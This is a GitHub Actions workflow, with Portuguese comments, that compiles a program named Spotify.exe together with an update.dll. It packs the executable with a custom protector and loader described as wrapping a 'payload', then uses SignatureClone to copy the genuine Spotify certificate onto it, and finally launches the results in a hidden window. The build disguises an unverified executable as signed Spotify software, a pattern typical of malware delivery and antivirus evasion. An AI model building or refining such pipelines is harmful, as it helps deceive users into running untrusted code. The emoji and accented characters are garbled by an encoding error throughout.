name: Build Spotify - Costura + Protector
on:
  push:
    branches: [ main, master, develop ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: üßæ Checkout c√≥digo
        uses: actions/checkout@v4

      - name: ‚öôÔ∏è Configurar .NET
        uses: actions/setup-dotnet@v3
        with:
          dotnet-version: '6.0.x'

      - name: ‚öôÔ∏è Configurar Visual Studio
        uses: microsoft/setup-msbuild@v1.3

      - name: üì¶ Instalar NuGet CLI
        run: choco install nuget.commandline -y

      - name: üîß Configurar FodyWeavers.xml
        shell: pwsh
        run: |
          Write-Host "üîß Criando FodyWeavers.xml..."
        
          $xml = '<?xml version="1.0" encoding="utf-8"?>'
          $xml += '<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">'
          $xml += '  <Costura />'
          $xml += '</Weavers>'
        
          $xml | Out-File -FilePath "FodyWeavers.xml" -Encoding UTF8 -Force
          Write-Host "‚úÖ FodyWeavers.xml configurado!"

      - name: üóëÔ∏è Limpar bin/obj
        shell: pwsh
        run: |
          @("bin", "obj") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Recurse -Force $_ -ErrorAction SilentlyContinue }
          }

      - name: üîÑ Restaurar depend√™ncias solu√ß√£o
        shell: pwsh
        run: |
          nuget restore Spotify.sln -Verbosity detailed
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üî® Compilar Release com Costura
        shell: pwsh
        run: |
          msbuild Spotify.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /verbosity:minimal /p:UseSharedCompilation=false
          if ($LASTEXITCODE -ne 0) { exit 1 }
          if (!(Test-Path "bin\Release\Spotify.exe")) { Write-Host "‚ùå Execut√°vel n√£o gerado"; exit 1 }

      - name: üîß Compilar Update DLL (update.dll)
        shell: pwsh
        run: |
          if (!(Test-Path "Update\Update.csproj")) { Write-Host "‚ùå Update.csproj n√£o encontrado"; exit 1 }
          msbuild Update\Update.csproj /p:Configuration=Release /m
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $dll = (Get-ChildItem "Update\bin\Release" -Recurse -Filter update.dll | Select-Object -First 1).FullName
          if (!$dll) { Write-Host "‚ùå update.dll n√£o encontrado ap√≥s build"; exit 1 }
          if (!(Test-Path "bin\Release")) { New-Item -ItemType Directory -Path "bin\Release" | Out-Null }
          Copy-Item $dll "bin\Release\update.dll" -Force

      - name: üõ°Ô∏è Compilar Protector (Mono.Cecil)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector\Protector.csproj")) { Write-Host "‚ùå Projeto Protector n√£o encontrado"; exit 1 }
          dotnet restore Protector\Protector.csproj
          dotnet build Protector\Protector.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üõ°Ô∏è Compilar Loader (Protector.Loader)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector.Loader\Protector.Loader.csproj")) { Write-Host "‚ùå Projeto Loader n√£o encontrado"; exit 1 }
          dotnet restore Protector.Loader\Protector.Loader.csproj
          dotnet build Protector.Loader\Protector.Loader.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $global:loaderPath = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$global:loaderPath) { Write-Host "‚ùå Loader compilado n√£o encontrado"; exit 1 }

      - name: üõ°Ô∏è Aplicar Protector (empacotar Loader + payload)
        shell: pwsh
        run: |
          $protExe = (Get-ChildItem "Protector\bin\Release" -Recurse -Filter Protector.exe | Select-Object -First 1).FullName
          if (!$protExe) { Write-Host "‚ùå Protector.exe n√£o encontrado"; exit 1 }
          $input = "bin\Release\Spotify.exe"
          $outDir = "bin\Protected"
          if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
          $output = "$outDir\Spotify.exe"
          $loader = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$loader) { Write-Host "‚ùå Loader n√£o encontrado"; exit 1 }
          & $protExe $input $output $loader
          if ($LASTEXITCODE -ne 0) { Write-Host "‚ùå Falha ao proteger"; exit 1 }

      - name: üîç Verificar resultado protegido
        shell: pwsh
        run: |
          $protected = "bin\Protected\Spotify.exe"
          if (!(Test-Path $protected)) { Write-Host "‚ùå Arquivo protegido n√£o gerado"; exit 1 }
          $orig = (Get-Item "bin\Release\Spotify.exe").Length
          $prot = (Get-Item $protected).Length
          Write-Host "üìä Original: $([math]::Round($orig/1MB,2)) MB"
          Write-Host "üõ°Ô∏è Protegido: $([math]::Round($prot/1MB,2)) MB"

      - name: üêç Configurar Python e SignatureClone
        shell: pwsh
        run: |
          Write-Host "üêç Configurando Python e SignatureClone..."
          
          # Instalar Python se necess√°rio
          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
            choco install python -y
            $env:Path += ";C:\Python*\Scripts;C:\Python*"
          }
          
          # Instalar depend√™ncias do SignatureClone
          pip install pefile cryptography
          
          # Verificar se SignatureClone est√° dispon√≠vel
          if (!(Test-Path "SignatureClone-main\SignatureClone.py")) {
            Write-Host "‚ùå SignatureClone n√£o encontrado"
            exit 1
          }
          
          Write-Host "‚úÖ Python e depend√™ncias configuradas"

      - name: üîê Clonar certificado do Spotify original
        shell: pwsh
        run: |
          Write-Host "üîê Clonando certificado do Spotify original..."
          
          $sourceCert = "Spotify.exe"  # Spotify original com certificado
          $targetFile = "bin\Protected\Spotify.exe"  # Arquivo protegido
          $outputFile = "bin\Protected\Spotify_Signed.exe"  # Arquivo final com certificado
          
          # Verificar se o Spotify original existe e tem certificado
          if (!(Test-Path $sourceCert)) {
            Write-Host "‚ùå Spotify.exe original n√£o encontrado na raiz"
            exit 1
          }
          
          # Verificar se o arquivo protegido existe
          if (!(Test-Path $targetFile)) {
            Write-Host "‚ùå Arquivo protegido n√£o encontrado"
            exit 1
          }
          
          Write-Host "üìã Fonte do certificado: $sourceCert"
          Write-Host "üìã Arquivo alvo: $targetFile"
          Write-Host "üìã Arquivo final: $outputFile"
          
          # Executar SignatureClone
          python "SignatureClone-main\SignatureClone.py" $sourceCert $targetFile $outputFile
          
          if ($LASTEXITCODE -ne 0) {
            Write-Host "‚ùå Falha ao clonar certificado"
            exit 1
          }
          
          # Verificar se o arquivo final foi criado
          if (!(Test-Path $outputFile)) {
            Write-Host "‚ùå Arquivo final com certificado n√£o foi criado"
            exit 1
          }
          
          $finalSize = (Get-Item $outputFile).Length
          Write-Host "‚úÖ Certificado clonado com sucesso!"
          Write-Host "üìä Arquivo final: $([math]::Round($finalSize/1MB,2)) MB"

      - name: üß™ Teste de execu√ß√£o
        shell: pwsh
        run: |
          function Test-Exe { param([string]$Path,[string]$Label)
            Write-Host "üìã $Label"
            $testDir = "test_$([guid]::NewGuid().ToString('N').Substring(0,8))"
            try {
              New-Item -ItemType Directory -Path $testDir | Out-Null
              Copy-Item $Path "$testDir\Spotify.exe"
              $p = Start-Process -FilePath "$testDir\Spotify.exe" -PassThru -WindowStyle Hidden -ErrorAction Stop
              Start-Sleep -Seconds 2
              if ($p -and !$p.HasExited) { Write-Host "‚úÖ OK (PID $($p.Id))"; $p.Kill(); return $true } else { return $false }
            } catch { Write-Host "‚ùå Erro: $($_.Exception.Message)"; return $false } finally { if (Test-Path $testDir) { Remove-Item -Recurse -Force $testDir -ErrorAction SilentlyContinue } }
          }
          
          function Test-Certificate { param([string]$Path)
            try {
              $cert = Get-AuthenticodeSignature $Path
              if ($cert.Status -eq "Valid") {
                Write-Host "‚úÖ Certificado v√°lido: $($cert.SignerCertificate.Subject)"
                return $true
              } elseif ($cert.Status -eq "NotSigned") {
                Write-Host "‚ö†Ô∏è Arquivo n√£o assinado"
                return $false
              } else {
                Write-Host "‚ö†Ô∏è Certificado presente mas inv√°lido: $($cert.Status)"
                return $true  # Certificado presente mas inv√°lido (esperado com clone)
              }
            } catch {
              Write-Host "‚ùå Erro ao verificar certificado: $($_.Exception.Message)"
              return $false
            }
          }
          
          $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
          $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
          
          # Verificar certificado no arquivo final
          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
            Test-Certificate "bin\Protected\Spotify_Signed.exe"
          }
          
          if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }

      - name: üìÅ Upload Arquivos Finais
        uses: actions/upload-artifact@v4
        with:
          name: spotify-final
          path: |
            bin/Protected/Spotify.exe
            bin/Protected/Spotify_Signed.exe
            bin/Release/update.dll
            cloned_certificate.cer
          retention-days: 90
        if: always()
